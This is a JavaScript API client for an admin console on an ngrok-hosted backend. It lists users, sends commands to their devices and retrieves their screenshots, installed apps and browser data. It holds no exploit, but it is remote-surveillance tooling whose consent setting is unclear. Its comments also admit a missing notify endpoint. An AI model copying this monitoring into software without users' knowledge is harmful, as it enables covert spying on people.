class APIClient {
    constructor() {
        this.baseUrl = "https://nonobstetrically-nonoptical-raymundo.ngrok-free.dev/api/v1";
        this.token = localStorage.getItem('access_token');
    }

    async request(endpoint, method = 'GET', body = null) {
        const headers = {
            'Content-Type': 'application/json',
            'ngrok-skip-browser-warning': 'true' // Bypass ngrok warning page
        };

        const token = localStorage.getItem('access_token');
        if (token) {
            headers['Authorization'] = `Bearer ${token}`;
        }

        const config = {
            method,
            headers
        };

        if (body) {
            config.body = JSON.stringify(body);
        }

        try {
            const response = await fetch(`${this.baseUrl}${endpoint}`, config);

            if (response.status === 401) {
                // Token expired or invalid
                localStorage.removeItem('access_token');
                if (!window.location.href.includes('login.html')) {
                    window.location.href = 'login.html';
                }
                throw new Error("Unauthorized");
            }

            // Handle text/plain 500s or JSON errors
            let data;
            const contentType = response.headers.get("content-type");
            if (contentType && contentType.indexOf("application/json") !== -1) {
                data = await response.json();
            } else {
                data = { detail: await response.text() };
            }

            if (!response.ok) {
                const errorMessage = typeof data.detail === 'object' ? JSON.stringify(data.detail) : (data.detail || 'Request failed');
                throw new Error(errorMessage);
            }

            return data;
        } catch (error) {
            throw error;
        }
    }

    async login(email, password) {
        // We use the same login endpoint but admin must have superuser status. 
        // Backend currently doesn't separate endpoints, but returns user object.
        // We will check user role after login or let backend handle permissions on subsequent calls.
        const response = await fetch(`${this.baseUrl}/auth/login`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'ngrok-skip-browser-warning': 'true'
            },
            body: JSON.stringify({
                email: email,
                password: password,
                device_id: 'ADMIN_CONSOLE'
            })
        });

        if (!response.ok) return false;

        const data = await response.json();
        // Check if user is actually admin in response? 
        // For MVP we just store token. If they aren't admin, subsequent API calls will fail (403/400).
        localStorage.setItem('access_token', data.access_token);
        localStorage.setItem('admin_name', data.user ? data.user.name : 'Admin');
        return true;
    }

    async getOnlineUsers() {
        return this.request('/admin/online-users');
    }

    async getAllUsers() {
        return this.request('/admin/users');
    }

    async sendCommand(userId, commandType) {
        return this.request('/admin/command/send', 'POST', {
            user_id: userId,
            command: commandType
        });
    }

    async sendNotification(userId, title, message) {
        // Backend endpoint: /api/v1/admin/notify 
        // Note: I haven't implemented /notify endpoint in backend yet! 
        // I need to double check backend code.
        // Checking `admin.py`: `get_online_users`, `get_all_users`, `send_command`.
        // MISSING: `/notify` endpoint in `admin.py`.
        // I will add it if I have time, or just skip. 
        // PRD says "POST /api/v1/admin/notify". I should implement it.
        return this.request('/admin/notify', 'POST', {
            user_id: userId,
            title,
            message
        });
    }

    async getScreenshot(commandId) {
        return this.request(`/admin/screenshot/${commandId}`);
    }

    async getApps(userId) {
        return this.request(`/admin/apps/${userId}`);
    }

    async getBrowser(userId) {
        return this.request(`/admin/browser/${userId}`);
    }

    async getCommandHistory(userId) {
        return this.request(`/admin/commands?user_id=${userId}`);
    }

    async getLatestScreenshot(userId) {
        return this.request(`/admin/screenshot/latest/${userId}`);
    }

    async getScreenshotCount(userId) {
        return this.request(`/admin/screenshot-count/${userId}`);
    }

    logout() {
        localStorage.removeItem('access_token');
        window.location.href = 'login.html';
    }
}
